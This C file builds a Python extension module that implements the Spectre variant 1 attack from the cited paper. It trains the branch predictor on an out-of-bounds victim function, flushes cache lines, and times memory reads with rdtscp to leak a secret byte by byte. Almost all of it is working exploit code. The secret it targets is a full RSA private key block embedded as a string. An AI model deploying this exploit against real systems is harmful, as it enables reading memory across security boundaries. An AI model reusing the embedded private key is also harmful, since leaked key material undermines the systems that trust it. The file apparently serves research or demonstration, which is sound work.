/* https://spectreattack.com/spectre.pdf */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#include <Python.h>

/********************************************************************
  Victim code.
 ********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];

/* String of the most common ASCII (<128) chars. */
char *trainer = " +-/0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

char *secret = "-----BEGIN RSA PRIVATE KEY----- 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 -----END RSA PRIVATE KEY-----";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

/********************************************************************
  Analysis code
 ********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint64_t timings[256]) {
    static int result = 0;
    int i, j, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++) {
        _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
    }
    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = 0; // always train on in range index to array1
    for (j = 29; j >= 0; j--) {
        _mm_clflush(&array1_size);
        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
        
        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
        /* Avoid jumps in case those tip off the branch predictor */
        x = ((j % 6) - 1) & ~0xFFFF;
        /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        x = (x | (x >> 16));
        /* Set x=-1 if j&6=0, else x=0 */
        x = training_x ^ (x & (malicious_x ^ training_x));
        
        /* Call the victim! */
        victim_function(x);
    }
    
    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
        mix_i = ((i * 167) + 13) & 255;
        addr = &array2[mix_i * 512];
        time1 = __rdtscp(&junk);         /* READ TIMER */
        junk = *addr;                    /* MEMORY ACCESS TO TIME */
        time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
        timings[mix_i] = time2;
    }
    
    result ^= junk; /* use junk so code above won’t get optimized out*/
}


/* Allows us to call readMemoryByte from python */
static PyObject* readMemoryBytePy(PyObject* self, PyObject *args) {
    size_t malicious_x;
    int use_trainer;
    uint64_t timings[256];
    uint32_t i;
    uint32_t position = 0;
    for (i = 0; i < sizeof(array2); i++) {
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    }

    PyArg_ParseTuple(args, "ip", &position, &use_trainer);
    if (use_trainer)
        malicious_x = (size_t)(trainer-(char*)array1);
    else
        malicious_x = (size_t)(secret-(char*)array1);

    readMemoryByte(malicious_x + position, timings);

    PyObject *pyTimings = PyList_New(256);
    for (i = 0; i < 256; i++) {
        PyList_SetItem(pyTimings, i, PyLong_FromLong(timings[i]));
    }
  
    return pyTimings;
}

static PyObject* getTrainerStr(PyObject* self, PyObject *args) {
    return PyUnicode_FromFormat("%s", trainer);
}

static PyObject* getSecretStr(PyObject* self, PyObject *args) {
    return PyUnicode_FromFormat("%s", secret);
}

/* Declaration of methods we can call from Python */
static PyMethodDef PySpectreMethods[] = {
    { "readMemoryByte", readMemoryBytePy, METH_VARARGS, NULL },
    { "getTrainerStr", getTrainerStr, METH_NOARGS, NULL },
    { "getSecretStr", getSecretStr, METH_NOARGS, NULL },
    { NULL, NULL, 0, NULL }
};

/* Declaration of this module */
static struct PyModuleDef PySpectreModule = {
    PyModuleDef_HEAD_INIT, "pyspectre",   NULL, -1, PySpectreMethods
};

/* Initialization function */
PyMODINIT_FUNC 
PyInit_pyspectre(void) {
    return PyModule_Create(&PySpectreModule);
}